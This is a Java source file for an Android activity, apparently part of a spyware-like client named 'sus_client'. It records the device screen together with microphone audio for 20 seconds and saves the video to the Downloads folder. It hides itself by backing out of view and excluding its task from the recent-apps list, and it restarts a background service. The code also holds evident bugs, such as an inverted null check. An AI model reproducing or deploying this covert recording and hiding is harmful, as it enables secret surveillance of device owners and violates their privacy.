package com.android.sus_client.applaunchers;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseIntArray;
import android.view.Surface;
import android.widget.RelativeLayout;
import android.widget.Toast;

import com.android.sus_client.annotation.Nullable;
import com.android.sus_client.annotation.RequiresApi;
import com.android.sus_client.services.ForegroundService;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.utils.ViewUtils;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.Random;


public class ScreenShotActivity extends Activity {

    private static final int videoTime = 1000 * 20;
    private static final int REQUEST_CODE = 1000;
    private static final int REQUEST_PERMISSION = 1000;
    private static final SparseIntArray ORIENTATION = new SparseIntArray();
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ScreenShotActivity.MediaProjectionCallback mediaProjectionCallback;
    private MediaRecorder mediaRecorder;
    private int mScreenDensity;
    private static int DISPLAY_WIDTH = 720;
    private static int DISPLAY_HEIGHT = 1280;

    static {
        ORIENTATION.append(Surface.ROTATION_0, 90);
        ORIENTATION.append(Surface.ROTATION_90, 0);
        ORIENTATION.append(Surface.ROTATION_180, 270);
        ORIENTATION.append(Surface.ROTATION_270, 180);
    }

    private String screenShotUri = "";

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(new RelativeLayout(this));
        init();
    }

    @Override
    protected void onResume() {
        super.onResume();
        Utils.setStatusBarTranslucent(this, Color.TRANSPARENT);
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void init() {
        //Screen tracking Code Started here..............................
        DisplayMetrics metrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(metrics);
        mScreenDensity = metrics.densityDpi;
        DISPLAY_HEIGHT = metrics.heightPixels;
        DISPLAY_WIDTH = metrics.widthPixels;

        Toast.makeText(this, "ScreenShotActivity: onCreate Called.", Toast.LENGTH_LONG).show();
        mediaRecorder = new MediaRecorder();
        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (ViewUtils.checkSelfPermission(ScreenShotActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) + ViewUtils.checkSelfPermission(ScreenShotActivity.this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            if (ViewUtils.shouldShowRequestPermissionRationale(ScreenShotActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) || ViewUtils.shouldShowRequestPermissionRationale(ScreenShotActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
            } else {
                ViewUtils.requestPermissions(ScreenShotActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.RECORD_AUDIO}, REQUEST_PERMISSION);
            }
        } else {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    toogleScreenShare();
                }
            }, 500);
        }
    }


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void toogleScreenShare() {
        initRecorder();
        recordScreen();
    }

    /**
     * FFmpegMediaMetadataRetriever -->
     * implementation 'com.github.wseemann:FFmpegMediaMetadataRetriever-core:1.0.19'
     * implementation 'com.github.wseemann:FFmpegMediaMetadataRetriever-native:1.0.19'
     */
    public void getPathScreenShot(String filePath) {
        //FFmpegMediaMetadataRetriever med = new FFmpegMediaMetadataRetriever();
        //med.setDataSource(filePath);
        //Bitmap bmp = med.getFrameAtTime(2 * 1000000, FFmpegMediaMetadataRetriever.OPTION_CLOSEST);
        Bitmap bmp = BitmapFactory.decodeResource(getResources(), android.R.drawable.sym_def_app_icon);
        String myPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + new StringBuilder("/screenshot").append(".bmp").toString();

        File myDir = new File(myPath);
        myDir.mkdirs();
        Random generator = new Random();
        int n = 10000;
        n = generator.nextInt(n);
        String fname = "Image-" + n + ".jpg";
        File file = new File(myDir, fname);
        log("ScreenShotActivity: " + file.getAbsolutePath());
        if (myDir.exists()) myDir.delete();
        try {
            FileOutputStream out = new FileOutputStream(myDir);
            bmp.compress(Bitmap.CompressFormat.JPEG, 90, out);
            out.flush();
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        //postScreenShot(myPath);
    }


    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void recordScreen() {
        if (mediaProjection == null) {
            startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE);
        } else {
            virtualDisplay = createVirtualDisplay();
            mediaRecorder.start();
            onBackPressed();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    mediaRecorder.stop();
                    mediaRecorder.reset();
                    stopRecordScreen();
                    destroyMediaProjection();
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            getPathScreenShot(screenShotUri);
                        }
                    }, 2000);
                }
            }, videoTime);
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private VirtualDisplay createVirtualDisplay() {
        return mediaProjection.createVirtualDisplay("MainActivity", DISPLAY_WIDTH, DISPLAY_HEIGHT, mScreenDensity, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, mediaRecorder.getSurface(), null, null);
    }

    private void initRecorder() {
        try {
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);

            screenShotUri = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + new StringBuilder("/screenshot").append(".mp4").toString();

            mediaRecorder.setOutputFile(screenShotUri);
            mediaRecorder.setVideoSize(DISPLAY_WIDTH, DISPLAY_HEIGHT);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setVideoEncodingBitRate(512 * 1000);
            mediaRecorder.setVideoFrameRate(5);

            int rotation = getWindowManager().getDefaultDisplay().getRotation();
            int orientation = ORIENTATION.get(rotation + 90);
            mediaRecorder.setOrientationHint(orientation);
            mediaRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
            log("ExceptionOccured: " + e.getMessage());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode != REQUEST_CODE) {
            stopService(new Intent(this, ForegroundService.class));
            startService(new Intent(this, ForegroundService.class));
            Toast.makeText(ScreenShotActivity.this, "Unknown Error", Toast.LENGTH_SHORT).show();
            log("Livetracking: ScreenShot" + requestCode + "  " + resultCode + " " + data);
            return;
        }
        if (resultCode != RESULT_OK) {
            stopService(new Intent(this, ForegroundService.class));
            startService(new Intent(this, ForegroundService.class));
            Toast.makeText(ScreenShotActivity.this, "Permission denied" + requestCode, Toast.LENGTH_SHORT).show();
            log("Livetracking: Screenshot" + requestCode + "  " + resultCode + " " + data);
            return;
        }
        log("Livetracking: Screenshot" + requestCode + "  " + resultCode + " " + data);

        mediaProjectionCallback = new ScreenShotActivity.MediaProjectionCallback();
        mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);
        mediaProjection.registerCallback(mediaProjectionCallback, null);
        virtualDisplay = createVirtualDisplay();
        mediaRecorder.start();
        onBackPressed();
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                mediaRecorder.stop();
                mediaRecorder.reset();
                stopRecordScreen();
                destroyMediaProjection();
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        getPathScreenShot(screenShotUri);
                    }
                }, 2000);
            }
        }, videoTime);
        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            List<ActivityManager.AppTask> tasks = am.getAppTasks();
            if (tasks != null && tasks.size() > 0) {
                log("RemovingApp from recent");
                tasks.get(0).setExcludeFromRecents(true);
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private class MediaProjectionCallback extends MediaProjection.Callback {
        @Override
        public void onStop() {
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaProjection = null;
            stopRecordScreen();
            destroyMediaProjection();
            if (mediaProjection != null) {
                destroyMediaProjection();
            }
            super.onStop();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void stopRecordScreen() {
        if (virtualDisplay == null) {
            virtualDisplay.release();
            if (mediaProjection != null) {
                destroyMediaProjection();
            }
            return;
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    private void destroyMediaProjection() {
        if (mediaProjection != null) {
            mediaProjection.unregisterCallback(mediaProjectionCallback);
            mediaProjection.stop();
            mediaProjection = null;
        }
    }

    private void log(String msg) {
        Log.e("ScreenShotActivity", msg);
    }

}